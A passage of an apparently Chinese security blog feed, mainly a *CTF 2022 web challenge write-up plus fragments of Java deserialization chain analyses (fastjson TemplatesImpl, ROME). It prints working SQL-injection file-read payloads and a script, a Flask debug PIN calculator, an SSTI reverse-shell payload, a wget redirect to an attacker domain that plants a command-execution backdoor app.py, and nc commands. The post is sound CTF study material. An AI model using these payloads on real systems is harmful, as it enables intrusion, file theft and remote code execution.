title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h2><p>根据token为16，会先进到<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>方法中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150433-agbqxc9.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150720-5xqscvg.png" alt="image.png"></p><p>随后进入到<code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>中，此处filedType判断为了这个<code>class [[B</code>类型，然后再进入到下面的deserialze方法中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150930-3ctd6md.png" alt="image.png"></p><p>然后就取出了bytecodes字段<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151148-ymejgk5.png" alt="image.png"></p><p>进入这个setValue方法中，可以看到传入的object就是TempaltesImpl对象，然后value即构造的恶意字节码</p><p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151238-g8t7y7s.png" alt="image.png"></p><p>通过这个方法把<code>_bytecodes</code>加入到TemplatesImpl对象中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151455-vtm7tif.png" alt="image.png"></p><p>然后他会通过这个parseFiled方法逐个取出parser也就是json中的字段名<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152148-xeeq7iv.png" alt="image.png"></p><p>直到解析这个字段，也就是<code>_outputProperties</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152330-rsou476.png" alt="image.png"></p><p>最后在<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code>中反射调用getOutputProperties方法，完成整个调用链调用，因为这里传入的object就是我们构造的恶意TemplatesImpl对象，这条攻击链可以在7d21中找到</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427153527-ier6p5m.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">通过最简单的利用TemplatesImpl反序列化来学习fastjson1.22-1.24漏洞</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="fastjson" scheme="https://xianbeil.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>starctf2022</title>
    <link href="https://xianbeil.github.io/2022/04/19/starctf2022/"/>
    <id>https://xianbeil.github.io/2022/04/19/starctf2022/</id>
    <published>2022-04-19T15:36:30.000Z</published>
    <updated>2022-06-02T00:37:08.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>21支队伍ak了道web题也体现出这个比赛对web手的“友好”——不ak就达不到平均值。。</p><p>还是太菜了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220417132137-fzotl1d.png" alt="image.png"></p><h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>登录之后在后台有注入，这里怎么都能注，能报错，能联合，能堆叠。唯一限制的地方可能是开了<code>secure_file_priv</code>不能用load_data</p><p>利用load data local infile 把文件数据读到自己建的表，并且可以绕过<code>secure_file_priv</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">建表whrssb：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;create%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb%28data%2F%2A%2A%2Fvarchar%284294967295%29%29ENGINE%3DInnoDB%2F%2A%2A%2FDEFAULT%2F%2A%2A%2FCHARSET%3Dutf8%3B%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">读文件</span></span><br><span class="line"><span class="string">1&#x27;</span>;load%2F%2A%2A%2Fdata%2F%2A%2A%2Flocal%2F%2A%2A%2Finfile%2F%2A%2A%2F%<span class="number">22</span>%2Fetc%2Fpasswd%<span class="number">22</span>%2F%2A%2A%2Finto%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb%<span class="number">23</span></span><br><span class="line">load/**/data/**/local/**/infile/**/<span class="string">&quot;/etc/passwd&quot;</span>/**/into/**/table/**/whrssb<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28data%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Fwhrssb%23  </span></span><br></pre></td></tr></table></figure><p>然后就能写脚本：</p><p>读取任意文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">basic_url = <span class="string">&quot;http://121.37.153.47:5002/&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;eyJjc3JmX3Rva2VuIjoiYzI1M2ZiNTQyMWRkY2ZjMGZmZDI5NGJlMDNkMDdjYzQwM2NhMzJjMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YlqUug.Sq9JqvfeVaFCF1mterkqzjBXTw8&quot;</span>&#125;</span><br><span class="line">url = basic_url + <span class="string">&quot;/view?note_id=&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_table</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload = <span class="string">&quot;1&#x27;;create%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%28data%2F%2A%2A%2Fvarchar%284294967295%29%29ENGINE%3DInnoDB%2F%2A%2A%2FDEFAULT%2F%2A%2A%2FCHARSET%3Dutf8%3B%23&quot;</span></span><br><span class="line">    r1 = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(&quot;[+]create table whrssb&quot;+str(id))</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params"><span class="built_in">id</span>,filename</span>):</span><br><span class="line">    new_filename = filename.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;%2F&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;1&#x27;;load%2F%2A%2A%2Fdata%2F%2A%2A%2Flocal%2F%2A%2A%2Finfile%2F%2A%2A%2F%22&quot;</span>+new_filename+<span class="string">&quot;%22%2F%2A%2A%2Finto%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%23&quot;</span></span><br><span class="line">    requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(&quot;write in &quot;+new_filename+&quot; to whrssb&quot;+str(id))</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28data%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%23&quot;</span></span><br><span class="line">    r1 = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(r1.text)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>():</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28table%5Fname%29from%2F%2A%2A%2Finformation%5Fschema%2Etables%2F%2A%2A%2Fwhere%2F%2A%2A%2Ftable%5Fschema%3Ddatabase%28%29%23&quot;</span></span><br><span class="line">    r = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">filename,<span class="built_in">id</span></span>):</span><br><span class="line">    create_table(<span class="built_in">id</span>)</span><br><span class="line">    write_file(<span class="built_in">id</span>,filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================&quot;</span>+filename+<span class="string">&quot;===============================================================&quot;</span>)</span><br><span class="line">    get_data(<span class="built_in">id</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;===============================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># get_file(&quot;/etc/passwd&quot;,11)</span></span><br><span class="line">    get_file(<span class="string">&quot;/sys/class/net/eth0/address&quot;</span>,<span class="number">657</span>)</span><br><span class="line">    get_file(<span class="string">&quot;/etc/machine-id&quot;</span>,<span class="number">1567</span>)</span><br><span class="line"></span><br><span class="line">    get_file(<span class="string">&quot;/proc/self/cgroup&quot;</span>,<span class="number">266</span>)</span><br><span class="line">    <span class="comment"># get_file(&quot;/flag_cantguessit&quot;,232)</span></span><br><span class="line">    <span class="comment"># get_tables()</span></span><br><span class="line">    <span class="comment"># get_file(&quot;/etc/passwd&quot;,&quot;dfd&quot;)</span></span><br></pre></td></tr></table></figure><p>flask开了debug模式，算pin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:c0:a8:00:03&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;1cc402dd0e11d5ae18db04a6de87223df94918dc15380836ea1b18193fe060888b28f6a7245d06858bf6ea3dc61fbeee&quot;</span><span class="comment">#/etc/machine-id+cgroup</span></span><br><span class="line">     ]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>然后这里就是玄学了，可能蹭到别人的车了，一般debug之后执行不了命令，但是有时又可以了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/V7LO8MI_5PABDPCL-20220417204534-6apl6dw.png" alt="V7LO8MI_5PABDPCL.png"></p><p>趁他可以的时候弹shell</p><p>（不抽风的时候，这里应该是蹭到其他一个环境里队伍的车了）：</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/92JZRR4UCWIYTKCH8VBG-20220417204633-60k2osr.png" alt="92JZRR4UCWIYTKCH8VBG.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/PPQWVV4G1FUDPCGH-20220417204645-e9hr7n5.png" alt="PPQWVV4G1FUDPCGH.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;exploit_Update_with_Version&#125;$</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p>这道题我做的方法，应该不是预期解（</p><p>老题目附件删掉了，了解了整个程序的逻辑就行。</p><p>整个获取flag的流程：</p><p>有一次修改环境变量的机会——&gt;从wget本地开的另一个服务获取到随机的lotto结果——&gt;和可控的预测结果匹配——&gt;相同返回flag</p><p>如果wget没有获取到新的flag，那lotto结果就会是上局的结果，是已知的，就能通过。</p><p>因此我通过修改环境变量PATH直接把wget拒之门外了，为了防止ban了其他的可能对正常流程影响的函数，就用通配符限制了一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/?:/usr/<span class="built_in">bin</span>/??:/usr/<span class="built_in">bin</span>/???:/usr/<span class="built_in">bin</span>/?????:/usr/<span class="built_in">bin</span>/?????*</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220417022313-7qizxta.png" alt="image.png"></p><h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><p>这道题比赛没做出来，属于赛后复现</p><p>当我们猜中的时候，不再返回flag，所以要考虑怎么通过修改环境变量<strong>rce</strong></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419201604-2cx3cnl.png" alt="image.png"></p><p>因此这道题涉及的知识点又是——环境变量注入</p><h2 id="解法1-挟持wget参数"><a href="#解法1-挟持wget参数" class="headerlink" title="解法1-挟持wget参数"></a>解法1-挟持wget参数</h2><p>貌似是非预期</p><p>看的y4tacker👴👴的wp学的，链接：<a href="https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/#oh-my-lotto-revenge">https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/#oh-my-lotto-revenge</a></p><p><code>wget --content-disposition -N lotto</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419205519-e7eoopj.png" alt="image.png"></p><p>当时自己做的时候也想通过修改代理让他请求别的地址，但是因为黑名单里ban了http所以没有成功</p><p>这里翻看<a href="https://www.gnu.org/software/wget/manual/wget.html#Proxies">wget的手册</a>，找到了可以利用的环境变量<code>WGETRC</code></p><p>试验一下发现可以挟持参数，比如http_proxy，也就是上面我们想干的事情</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419210821-znf69a1.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419210907-y8lmxgi.png" alt="image.png"></p><p>这里结合输出参数，覆盖原有的index.html打ssti即可</p><blockquote><p>output_document &#x3D; fileSet </p><p>the output filename—the same as ‘-O file’.</p></blockquote><p>写入WGETRC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_proxy=http:<span class="comment">//xxxxx</span></span><br><span class="line">output_document = templates/index.html</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入html内容：</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;反弹shell&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>能可控写入就行</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419221514-z08ioyl.png" alt="image.png"></p><h2 id="解法2-HOSTALIASES"><a href="#解法2-HOSTALIASES" class="headerlink" title="解法2-HOSTALIASES"></a>解法2-HOSTALIASES</h2><p><a href="https://github.com/sixstars/starctf2022/blob/main/web-oh-my-lotto%20%26%20revenge/web-oh-my-lotto%26revenge-ZH.md">https://github.com/sixstars/starctf2022/blob/main/web-oh-my-lotto%20%26%20revenge/web-oh-my-lotto%26revenge-ZH.md</a></p><p>通过阅读<a href="http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html">linux文档</a>，发现在Network Settings中有可以利用的地方</p><p>在Network Settings中发现有<code>HOSTALIASES</code>可以设置shell的hosts加载文件，利用<code>/forecast</code>路由可以上传待加载的hosts文件，将<code>wget --content-disposition -N lotto</code>发向lotto的请求转发到自己的域名例如如下hosts文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hosts</span><br><span class="line">lotto mydomain.com</span><br></pre></td></tr></table></figure><p>这样就可以请求到我们自己的vps上面</p><p><code>--content-disposition</code>参数让wget下载比当前目录下新的文件，所以我们可以覆盖app.py</p><p>还是wp中给出的poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    r = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from flask import Flask,request</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string">@app.route(&quot;/test&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="string">def test():</span></span><br><span class="line"><span class="string">    a = request.args.get(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">    a = os.popen(a)</span></span><br><span class="line"><span class="string">    a = a.read()</span></span><br><span class="line"><span class="string">    return str(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    app.run(debug=True,host=&#x27;0.0.0.0&#x27;, port=8080)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=app.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>此时虽然app.py已经被覆盖，但是没有被部署</p><p>题目用的是<code>gunicorn.conf.py</code>来部署的，我们让他超时就能够重写加载我们覆盖掉的app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span></span><br></pre></td></tr></table></figure><p>然后就能rce了，感觉这道题的关键还是在环境变量那里，当时做题的时候想到去修改代理，但是http等关键词被ban了就不会了，还得是去翻可用的环境变量，找到能够修改shell的代理的HOSTALIASES，从而才能覆盖app.py</p><p>关于linux，还是有好多可以学习的地方啊！</p>]]></content>
    
    
    <summary type="html">对*ctf web部分的复现及思考</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>rome反序列化链</title>
    <link href="https://xianbeil.github.io/2022/04/19/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <id>https://xianbeil.github.io/2022/04/19/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</id>
    <published>2022-04-19T06:34:00.000Z</published>
    <updated>2022-04-22T10:40:47.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>突然发现十天没更新博客了，大概我觉得自己学的东西很垃圾，没有自己创造的一些东西吧。</p><p>但是日子还得过，博客还得写。</p><p>学习是一辈子的事情，不想让坏心情来妨碍我的步调。</p><h1 id="Gaget-Chains"><a href="#Gaget-Chains" class="headerlink" title="Gaget Chains"></a>Gaget Chains</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * DelegatingMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * Method.invoke(Object, Object...)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString()</span></span><br><span class="line"><span class="comment"> * ObjectBean.toString()</span></span><br><span class="line"><span class="comment"> * EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment"> * ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.hash(Object)</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>依赖：rome1.0+jdk1.8+tomcat9</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419085128-jkf2hpo.png" alt="image.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote><p>基于ysoserial</p></blockquote><h2 id="ToStringBean-toString-String-prefix"><a href="#ToStringBean-toString-String-prefix" class="headerlink" 